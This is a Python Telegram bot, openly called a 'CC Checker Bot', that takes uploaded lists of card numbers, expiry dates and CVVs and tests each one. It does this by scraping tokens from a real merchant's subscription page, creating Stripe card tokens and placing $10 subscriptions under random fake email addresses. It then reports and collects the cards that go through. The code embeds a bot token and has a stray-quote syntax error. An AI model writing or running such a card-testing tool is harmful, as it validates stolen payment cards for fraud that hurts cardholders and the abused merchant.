import requests
import random
import telebot
import time
from telebot import types
from datetime import datetime

def getstr(text: str, a: str, b: str) -> str:
    return text.split(a)[1].split(b)[0]

def stripe(cc):
    n, m, y, cv = cc.split('|')
    r = requests.session()
    rp = r.get("https://me.strictlyyou.com.au/subscriptions/new?plan_id=plan_FcpX62iz3bysdk", headers={
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0',
    }).text
    p = getstr(rp, '"authenticity_token" value="', '"')
    rnd1 = getstr(rp, 'random-key" name="', '"')
    rnd2 = getstr(rp, f'{rnd1}" value="', '"')
    csrf = getstr(rp, 'name="csrf-token" content="', '"')
    pk = getstr(rp, 'setPublishableKey("', '"')
    
    headers = {
        'authority': 'api.stripe.com',
        'content-type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0',
    }
    data = f'time_on_page=17468&guid=NA&muid=369afed2-542f-4b0e-afaf-821f1ff0fcd3a20185&sid=901178de-3082-486a-bb0a-76e6bcb4e6f8995ff9&key={pk}&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[exp_month]={m.replace("0", "")}&card[exp_year]={y}&card[cvc]={cv}'
    
    idf = r.post('https://api.stripe.com/v1/tokens', headers=headers, data=data).json().get('id', None)

    if not idf:
        return "❌ Token generation failed. Invalid card."

    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0',
        'X-CSRF-Token': csrf,
        'X-Requested-With': 'XMLHttpRequest',
    }

    em = str(''.join(random.choice('abcdefghijklmnopqrstuvwxyz123456789') for _ in range(9))) + '@gmail.com'
    data = [
        ('utf8', '✓'),
        ('authenticity_token', p),
        (rnd1, rnd2),
        ('email', em),
        ('plan_type', 'subscription_plan'),
        ('plan_id', '14'),
        ('stripeToken', idf),
        ('stripeEmail', em),
        ('coupon', ''),
        ('quantity', ''),
    ]

    response = r.post('https://me.strictlyyou.com.au/subscriptions', cookies=r.cookies, headers=headers, data=data).json()
    guid = response.get('guid', None)

    if not guid:
        return "❌ Subscription failed."

    response = r.get(f'https://me.strictlyyou.com.au/payola/subscription_status/{guid}', cookies=r.cookies, headers=headers).json()
    if 'None' in str(response):
        return '❌ Your card has insufficient funds.'
    else:
        msg = str(response)
        if any(phrase in msg for phrase in ["Thank you for your purchase!", "success", "processed"]):
            return '✅ Approved: Charge $10'
        else:
            return '❌ ' + str(response.get('error', 'Unknown error'))

bot = telebot.TeleBot('7900963523:AAGmz7jeyKWEvs02XHNHhCMZqdfb2M-YSno'')

# Global variable to control the state of the bot
running = False
paused = False
current_chat_id = None
current_file_path = None

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the CC Checker Bot! Please upload a text file with credit card information in the format: `number|month|year|cvv` (e.g., `4111111111111111|12|25|123`).")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    global current_file_path
    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    current_file_path = "cc_list.txt"
    with open(current_file_path, "wb") as new_file:
        new_file.write(downloaded_file)

    bot.reply_to(message, "File received! Use the buttons below to start checking the credit cards.", reply_markup=start_stop_markup())

def start_stop_markup():
    markup = types.InlineKeyboardMarkup()
    start_button = types.InlineKeyboardButton("Start", callback_data="start_check")
    stop_button = types.InlineKeyboardButton("Stop", callback_data="stop_check")
    hold_button = types.InlineKeyboardButton("Hold", callback_data="hold_check")
    markup.add(start_button, stop_button, hold_button)
    return markup

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    global running, paused, current_chat_id

    if call.data == "start_check":
        if not running:
            running = True
            paused = False
            current_chat_id = call.message.chat.id
            check_credit_cards(current_file_path, current_chat_id)
            bot.answer_callback_query(call.id, "Started checking credit cards!")
        else:
            bot.answer_callback_query(call.id, "Already running!")

    elif call.data == "stop_check":
        running = False
        paused = False
        bot.answer_callback_query(call.id, "Stopped checking credit cards!")

    elif call.data == "hold_check":
        if running:
            paused = True
            running = False
            bot.answer_callback_query(call.id, "Paused checking credit cards!")
            show_restart_stop_buttons(call.message.chat.id)
        else:
            bot.answer_callback_query(call.id, "Not currently running!")

def show_restart_stop_buttons(chat_id):
    markup = types.InlineKeyboardMarkup()
    restart_button = types.InlineKeyboardButton("Restart", callback_data="restart_check")
    stop_button = types.InlineKeyboardButton("Stop", callback_data="stop_check")
    markup.add(restart_button, stop_button)
    bot.send_message(chat_id, "You have paused the process. Choose an option:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data in ["restart_check", "stop_check"])
def handle_restart_stop_buttons(call):
    global running, paused

    if call.data == "restart_check":
        paused = False
        running = True
        check_credit_cards(current_file_path, call.message.chat.id)
        bot.answer_callback_query(call.id, "Restarted checking credit cards!")

    elif call.data == "stop_check":
        running = False
        paused = False
        bot.answer_callback_query(call.id, "Stopped checking credit cards!")

def check_credit_cards(file_path, chat_id):
    global running, paused
    with open(file_path, 'r') as f:
        lines = f.readlines()

    total_cards = len(lines)
    processed = 0
    approved_cards = []

    start_time = time.time()

    for cc in lines:
        cc = cc.strip()
        if not running:  # Stop if not running
            break

        if paused:  # Pause functionality
            break

        try:
            result = stripe(cc)
            processed += 1
            progress = (processed / total_cards) * 100
            
            # Log the status in a more interesting way
            print(f'\n{datetime.now().strftime("%Y-%m-%d %H:%M:%S")} | Card: {cc} | Status: {result}')

            # Check if the card is approved and store it
            if 'Approved' in result:
                approved_cards.append(cc)

            # Send a structured message for each processed card
            bot.send_message(chat_id, f"🗂️ Card: `{cc}`\nStatus: {result}\nProgress: {processed}/{total_cards} ({progress:.2f}%)")
            time.sleep(1)  # Adjust sleep time as needed for rate limiting

        except Exception as e:
            bot.send_message(chat_id, f"❌ **Error processing:** `{cc}`\n**Error Message:** {str(e)}")

    end_time = time.time()
    elapsed_time = end_time - start_time

    # Final summary of approved cards
    if approved_cards:
        approved_summary = "\n✅ Approved Credit Cards:\n" + "\n".join(approved_cards)
    else:
        approved_summary = "❌ No approved credit cards found."

    bot.send_message(chat_id, f"✅ Finished checking all credit cards in {elapsed_time:.2f} seconds!\n{approved_summary}")

bot.polling()
